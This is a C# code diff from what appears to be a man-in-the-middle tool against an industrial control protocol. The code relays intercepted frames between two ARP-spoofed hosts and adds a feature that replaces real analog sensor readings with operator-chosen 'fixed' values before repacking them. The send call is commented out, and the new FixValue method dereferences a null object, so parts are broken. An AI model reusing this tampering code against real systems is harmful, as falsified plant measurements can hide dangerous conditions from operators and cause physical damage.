@@ -113,26 +113,11 @@ namespace MITM_Service
                             packetStruct = packetStructs.Dequeue();
                         }
 
-                        int offset = 54;
+                        int offset = packetStruct.dataOffset;
 
                         byte len = packetStruct.packet[offset + 2];
 
-                        int actualLen = (byte)(2 + 1 + 5 + 2); // start + len + ctrl + dest + source + crc
-
-                        len -= 5; // minus header
-
-                        while (len > 0)
-                        {
-                            if (len < 16)
-                            {
-                                // last chunk
-                                actualLen += (byte)(len + 2);
-                                break;
-                            }
-
-                            actualLen += (byte)(16 + 2);
-                            len -= 16;
-                        }
+                        int actualLen = packetStruct.dataLength;
 
                         byte[] message = new byte[actualLen];
 
@@ -148,39 +133,7 @@ namespace MITM_Service
                             continue;
                         }
 
-                        Task.Factory.StartNew(() => ProcessObjects(userLevelObjects));
-
-                        List<byte[]> segments = applicationHandler.PackDown(userLevelObjects, userLevelObjects[0].FunctionCode, dataLinkHandler.IsMaster, dataLinkHandler.IsPrm);
-
-                        segments[0].CopyTo(packetStruct.packet, offset);
-
-                        byte[] transmiterTarget = new byte[6];
-                        for (int i = 0; i < 6; i++)
-                        {
-                            transmiterTarget[i] = packetStruct.packet[i + 6];
-                        }
-
-                        byte[] receiverTarget;
-                        if (AreEqual(transmiterTarget, Database.ARPSpoofParticipantsInfo.Target1MACAddress))
-                        {
-                            receiverTarget = Database.ARPSpoofParticipantsInfo.Target2MACAddress;
-                        }
-                        else
-                        {
-                            receiverTarget = Database.ARPSpoofParticipantsInfo.Target1MACAddress;
-                        }
-
-                        byte[] myAddress = Database.ARPSpoofParticipantsInfo.MyMACAddress;
-
-                        receiverTarget.CopyTo(packetStruct.packet, 0);
-                        myAddress.CopyTo(packetStruct.packet, 6);
-
-                        SendPacketStruct sendPacketStruct = new SendPacketStruct();
-                        sendPacketStruct.Name = Database.GlobalConnectionInfo.Name;
-                        sendPacketStruct.Packet = packetStruct.packet;
-                        sendPacketStruct.Size = offset + actualLen;
-
-                        //Task.Factory.StartNew(() => SendPacket(ref sendPacketStruct));
+                        Task.Factory.StartNew(() => ProcessObjects(userLevelObjects, packetStruct));
 
                         Thread.Sleep(100);
                     }
@@ -207,7 +160,7 @@ namespace MITM_Service
             return true;
         }
 
-        void ProcessObjects(List<UserLevelObject> userLevelObjects)
+        void ProcessObjects(List<UserLevelObject> userLevelObjects, PacketStruct packetStruct)
         {
             try
             {
@@ -236,8 +189,19 @@ namespace MITM_Service
 
                                         lock (Database.lockObject)
                                         {
-                                            analogInputPoint.RawValue = BitConverter.ToInt32(userObject.Values[i], 0);
-                                            analogInputPoint.Value = analogInputPoint.RawValue * analogInputPoint.ScaleFactor + analogInputPoint.ScaleOffset;
+                                            analogInputPoint.RawOutValue = BitConverter.ToInt32(userObject.Values[i], 0);
+                                            analogInputPoint.OutValue = analogInputPoint.RawValue * analogInputPoint.ScaleFactor + analogInputPoint.ScaleOffset;
+
+                                            FixedValue fixedValue = null;
+                                            if (Database.FixedValues.TryGetValue(new Tuple<int, PointType>(i, PointType.ANALOG_INPUT), out fixedValue))
+                                            {
+                                                userObject.Values[i] = BitConverter.GetBytes(fixedValue.Value);
+                                            }
+                                            else
+                                            {
+                                                analogInputPoint.RawMasterValue = analogInputPoint.RawOutValue;
+                                                analogInputPoint.MasterValue = analogInputPoint.OutValue;
+                                            }
                                         }
 
                                         publisher.AnalogInputChange(analogInputPoint);
@@ -247,6 +211,41 @@ namespace MITM_Service
                         }
                     }
                 }
+
+                List<byte[]> segments = applicationHandler.PackDown(userLevelObjects, userLevelObjects[0].FunctionCode, dataLinkHandler.IsMaster, dataLinkHandler.IsPrm);
+
+                int offset = packetStruct.dataOffset;
+                int actualLen = packetStruct.dataLength;
+
+                segments[0].CopyTo(packetStruct.packet, packetStruct.dataOffset);
+
+                byte[] transmiterTarget = new byte[6];
+                for (int i = 0; i < 6; i++)
+                {
+                    transmiterTarget[i] = packetStruct.packet[i + 6];
+                }
+
+                byte[] receiverTarget;
+                if (AreEqual(transmiterTarget, Database.ARPSpoofParticipantsInfo.Target1MACAddress))
+                {
+                    receiverTarget = Database.ARPSpoofParticipantsInfo.Target2MACAddress;
+                }
+                else
+                {
+                    receiverTarget = Database.ARPSpoofParticipantsInfo.Target1MACAddress;
+                }
+
+                byte[] myAddress = Database.ARPSpoofParticipantsInfo.MyMACAddress;
+
+                receiverTarget.CopyTo(packetStruct.packet, 0);
+                myAddress.CopyTo(packetStruct.packet, 6);
+
+                SendPacketStruct sendPacketStruct = new SendPacketStruct();
+                sendPacketStruct.Name = Database.GlobalConnectionInfo.Name;
+                sendPacketStruct.Packet = packetStruct.packet;
+                sendPacketStruct.Size = offset + actualLen;
+
+                //Task.Factory.StartNew(() => SendPacket(ref sendPacketStruct));
             }
             catch (Exception e) { }
         }
@@ -325,6 +324,35 @@ namespace MITM_Service
             }
 
             return hosts;
+        }
+
+        public void FixValue(PointType pointType, int index)
+        {
+            FixedValue fixedValue = null;
+            if (pointType == PointType.ANALOG_INPUT)
+            {
+                lock (Database.lockObject)
+                {
+                    AnalogInputPoint analogInputPoint = null;
+                    if (Database.AnalogInputPoints.TryGetValue(index, out analogInputPoint))
+                    {
+                        fixedValue.Index = index;
+                        fixedValue.Value = analogInputPoint.RawValue;
+                    }
+                }
+            }
+        }
+
+        public void ReleaseValue(PointType pointType, int index)
+        {
+            lock (Database.lockObject)
+            {
+                FixedValue fixedValue = null;
+                if (Database.FixedValues.TryGetValue(new Tuple<int, PointType>(index, pointType), out fixedValue))
+                {
+                    Database.FixedValues.Remove(new Tuple<int, PointType>(index, pointType));
+                }
+            }
         }
     }
 }
